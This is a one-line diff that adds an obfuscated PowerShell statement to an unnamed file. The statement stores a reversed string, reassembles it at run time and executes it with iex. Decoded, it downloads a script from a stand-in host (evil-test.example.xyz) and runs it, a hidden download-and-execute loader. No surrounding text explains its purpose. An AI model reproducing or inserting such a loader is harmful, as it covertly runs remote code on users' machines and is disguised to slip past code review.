@@ -1,0 +1,1 @@
+$s='xei | )''1sp.p/zyx.elpmaxe.tset-live//:ptth''(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( ;''lanif-egats'' tsoH-etirW'; iex ($s[-1..-($s.Length)] -join '')
